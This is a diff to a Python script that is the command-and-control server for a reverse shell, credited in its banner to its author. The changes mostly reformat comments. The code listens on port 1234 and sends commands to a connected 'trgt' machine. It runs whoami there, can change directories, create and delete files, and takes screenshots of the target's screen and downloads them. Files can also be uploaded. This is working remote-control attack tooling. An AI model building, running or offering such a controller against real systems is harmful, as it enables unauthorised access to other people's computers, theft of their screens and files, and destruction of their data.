@@ -1,21 +1,20 @@
 #!/usr/bin/python3
 
 import socket
-from termcolor import colored # python coloring library
+from termcolor import colored  # python coloring library
 import time
-import os
-# Library can be used to change directory by the C2 server owner, after getting a shell back from trgt
+import os                      # Library can be used to change directory by the C2 server owner, after getting a shell back from trgt
 
-import json
-# The process of encoding JSON is usually called serialization. This term refers to the transformation of data into a series of bytes (hence serial) to be stored or transmitted across a network.
+import json                    # The process of encoding JSON is usually called serialization.
+                               # This term refers to the transformation of data into a series of bytes (hence serial) to be stored or transmitted across a network.
 
-import pyfiglet # python library to print ASCII art fonts
+import pyfiglet                # python library to print ASCII art fonts
 
 # Sending whole data all at once
 def send_eff(data):
 
 	json_data = json.dumps(data)
-	trgt.send(json_data.encode('utf-8')) # encoding data to bytes
+	trgt.send(json_data.encode('utf-8'))          # encoding data to bytes
 
 # Receiving whole data all at once
 def recv_eff():
@@ -83,11 +82,11 @@ def banner():
 	print("\r")
 
 	print(colored("Created by @soumyani1", 'blue'))
-	
+
 	print("\n")
 
 	print(colored("~> Please feel free to reach me for some suggestions:",'yellow'))
-	
+
 	print(colored('''
 ⚪ https://www.linkedin.com/in/soumyanil-biswas/
 ⚪ https://twitter.com/soumyani1
@@ -106,10 +105,10 @@ def server():
 
 	banner()
 
-	ip = "0.0.0.0" # listening on any ip, change it (if you wish to)
-	port = 1234 # chnage it (if you wish to)
+	ip = "0.0.0.0"                              # listening on any ip, change it (if you wish to)
+	port = 1234                                 # chnage it (if you wish to)
 
-	sock.bind((ip, port)) # binding ip and port to form a method
+	sock.bind((ip, port))                       # binding ip and port to form a method
 	sock.listen(5)
 
 	print(colored('''
@@ -130,11 +129,11 @@ def shell():
 
 	while True:
 
-		cmd = input(f"{username}@{ip}~> ") # trgt shell prompt
+		cmd = input(f"{username}@{ip}~> ")                # trgt shell prompt
 		send_eff(cmd)
 
 
-		#shell_cmd() # shell command support
+		# shell command support
 
 		if cmd == "exit":  # ✓
 			print(colored("\n[*] Closing connection...", 'yellow'))
@@ -198,22 +197,22 @@ You can also use other commands related to networking, etc for linux as well as 
 		# Making folder/directory in linux and windows ✓
 		elif cmd[:5] == "mkdir" and len(cmd) > 1:
 
-			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+			continue                             # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 		# Making file in linux ✓
 		elif cmd[:5] == "touch" and len(cmd) > 1:
 
-			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+			continue                             # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 		# Editing/writing on file on linux and windows ✓
 		elif cmd[:4] == "echo" and len(cmd) > 1 and cmd.find('>'):
 
-			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt		
+			continue                             # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 		# Appending on file on linux and windows ✓
 		elif cmd[:4] == "echo" and len(cmd) > 1 and cmd.find('>>'):
 
-			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+			continue                             # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 
 		# clearing screen in windows/linux  ✓
@@ -227,30 +226,30 @@ You can also use other commands related to networking, etc for linux as well as 
 		# Changing directory  ✓
 		elif cmd[:2] == "cd" and len(cmd) > 1:
 
-			continue # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+			continue                             # we know that after changing direc nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 
 		# Removing file path in linux  ✓
 		elif cmd[:2] == "rm" and len(cmd) > 1:
 
-			continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+			continue 			     # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 
 		# Removing file path in Win  ✓
 		elif cmd[:3] == "del" and len(cmd) > 1:
 
-			continue # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
+			continue   			     # we know that after removing path nothing is shown in terminal/cmd, so we have to receive nothing as data from trgt
 
 
 		# Screenshot
 
-		# screenshot function is same as download as after all we would only 
+		# screenshot function is same as download as after all we would only
 		# download the captured image from trgt as rev_shell gonna take the ss
 		elif (cmd[:10 ] == "screenshot" and len(cmd) > 1 ) or (cmd[:2] == 'ss' and len(cmd) > 1 ):
 
 			file = open(f"screenshot{counter}.png", 'wb')
 
-			trgt.settimeout(5) # taking 5 second for maximum as taking screenshot via 					    # rev_shell and downloading it can take time.
+			trgt.settimeout(5)                   # taking 5 second for maximum as taking screenshot via rev_shell, and downloading it, can take time.
 
 		        # if all file datas are sent and nothing left for download,
         		# the socket will keep on listening, but will not receive
@@ -289,7 +288,7 @@ You can also use other commands related to networking, etc for linux as well as 
 			upload_file(cmd[5:])
 
 		else:
-			result = recv_eff() # received response
+			result = recv_eff()  # received response
 			print(result)
 
 
@@ -299,13 +298,13 @@ def get_username():
 
 	global username
 
-	username = "whoami" # to know the username of the trgt
+	username = "whoami"                 # to know the username of the trgt
 	send_eff(username)
 
 
-	username = recv_eff() # received response
+	username = recv_eff()               # received response
 
-	username = username.strip() # Stripping out EOL spacing
+	username = username.strip()         # Stripping out EOL spacing
 
 	return username
 
@@ -313,10 +312,10 @@ def get_username():
 def main():
 	server()
 
-	username = get_username() # getting username for making interactive shell from trgt
+	username = get_username()           # getting username for making interactive shell from trgt
 
-	shell() # Getting shell for trgt
-	sock.close() # Closing listening socket as soon as 'exit' command is used in terminal by C2 server owner to break out of shell() function
+	shell()                             # Getting shell for trgt
+	sock.close()                        # Closing listening socket as soon as 'exit' command is used in terminal by C2 server owner to break out of shell() function
 
 
 if __name__ == '__main__':
